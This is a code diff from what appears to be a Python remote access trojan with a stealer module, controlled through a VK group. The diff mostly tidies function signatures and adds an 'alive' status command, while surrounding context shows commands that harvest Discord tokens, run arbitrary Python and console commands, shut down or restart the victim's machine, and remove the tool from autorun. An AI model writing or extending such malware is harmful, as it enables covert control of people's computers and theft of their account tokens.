@@ -620,13 +620,13 @@ def command_screenshot(_arguments, _event) -> typing.List:
     return [_path, "Screenshot", "photo"]
 
 
-def command_python(_arguments, _event) -> str:
+def command_python(arguments, event) -> str:
     # @function command_python()
     # @returns str
     # @description Function for command "python" that executes python code.
 
     # Executing.
-    return execute_python(_arguments, globals(), locals())
+    return execute_python(arguments, globals(), locals())
 
 
 def command_tags(_arguments, _event) -> str:
@@ -745,12 +745,6 @@ def command_discord_tokens(_arguments: str, _event) -> str:
 
     # Returning.
     return ",\n".join(_tokens)
-
-
-def command_alive(*args, **kwargs):
-    # Getting current time.
-    _current_time = datetime.datetime.now().strftime("%H:%M:%S")
-    return f"Alive! Time: {_current_time}"
 
 
 def command_discord_profile_raw(_arguments: str, _event) -> str:
@@ -1120,7 +1114,7 @@ def stealer_steal_data(_force: bool = False):
 def client_answer_server(event) -> None:
     # @function client_answer_server()
     # @returns None
-    # @description Function that process message from the remote access (server).nction that process message from the remote access (server).nction that process message from the remote access (server).nction that process message from the remote access (server).nction that process message from the remote access (server).nction that process message from the remote access (server).nction that process message from the remote access (server).
+    # @description Function that process message from the remote access (server).
 
     if config["server"]["type"] == "VK_GROUP":
         message = event.message
@@ -1340,7 +1334,7 @@ def execute_python(_code: str, _globals: typing.Dict, _locals: typing.Dict) -> a
 
 # Commands.
 
-def command_discord_profile(*args, **kwargs) -> str:
+def command_discord_profile(*_) -> str:
     """ Command `discord_profile` that returns information about Discord found in system ,(comma)."""
 
     # Getting tokens.
@@ -1372,7 +1366,7 @@ def command_discord_profile(*args, **kwargs) -> str:
         return "Failed to get Discord profile!"
 
 
-def command_exit(*args, **kwargs) -> str:
+def command_exit(*_) -> str:
     """ Command `exit` that exists app. """
 
     # Exiting.
@@ -1382,7 +1376,7 @@ def command_exit(*args, **kwargs) -> str:
     return "Exiting..."  # noqa
 
 
-def command_shutdown(*args, **kwargs) -> str:
+def command_shutdown(*_) -> str:
     """ Command `shutdown` that shutdown system. """
 
     # Shutdown.
@@ -1392,7 +1386,17 @@ def command_shutdown(*args, **kwargs) -> str:
     return "Shutdowning system (`shutdown /s /t 0`)..."
 
 
-def command_restart(*args, **kwargs) -> str:
+def command_alive(*_):
+    """ Command `alive` that show current time. """
+
+    # Getting current time.
+    current_time = datetime.datetime.now().strftime("%H:%M:%S")
+
+    # Message.
+    return f"Alive! Time: {current_time}"
+
+
+def command_restart(*_) -> str:
     """ Command `restart` that restarts system. """
 
     # Restarting.
@@ -1402,7 +1406,7 @@ def command_restart(*args, **kwargs) -> str:
     return "Restarting system (`shutdown /r /t 0`)..."
 
 
-def command_console(arguments, *args, **kwargs) -> str:
+def command_console(arguments, _) -> str:
     """ Command `console` that executing console. """
 
     # Call console.
@@ -1424,7 +1428,7 @@ def command_console(arguments, *args, **kwargs) -> str:
 def execute_command(command_name: str, arguments: str, event) -> str:
     """ Function that executes command and return it result. """
 
-    for command in commands_functions:  # noqa
+    for command in commands_functions:
         # For all commands names in commands dict.
 
         if command_name == command:
@@ -2260,7 +2264,8 @@ def initialise_commands() -> None:
         "message": command_message,
         "destruct": command_destruct,
         "download": command_download,
-        "properties": command_properties
+        "properties": command_properties,
+        "alive": command_alive
     }
 
     # Commands help.
@@ -2376,6 +2381,10 @@ def initialise_commands() -> None:
         "destruct": (
             "Delete app from the system (Removing from the autorun and closing)",
             "destruct"
+        ),
+        "alive": (
+            "Shows current time",
+            "alive"
         )
     }
 
